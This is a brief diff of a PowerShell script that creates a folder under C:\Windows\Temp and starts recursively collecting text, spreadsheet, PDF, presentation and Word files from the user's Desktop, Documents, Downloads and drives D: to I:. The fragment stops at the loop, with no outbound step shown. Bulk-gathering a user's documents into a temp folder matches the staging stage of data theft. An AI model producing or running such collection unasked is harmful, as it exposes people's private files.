@@ -1,4 +1,4 @@
-﻿New-Item -Path C:\Windows\Temp\test -ItemType Directory
+New-Item -Path 'C:\Windows\Temp\test' -ItemType Directory
 $src =  "C:\Users\$env:username\desktop","C:\Users\$env:username\Documents","C:\Users\$env:username\Downloads",'D:\','E:\','F:\','G:\','H:\','I:\' 
 #copy files to one folder
 foreach($files in Get-ChildItem -path $src -Include *.txt,*.xlsx,*.pdf,*.ppt,*.docx -Recurse | %{$_.FullName}){    
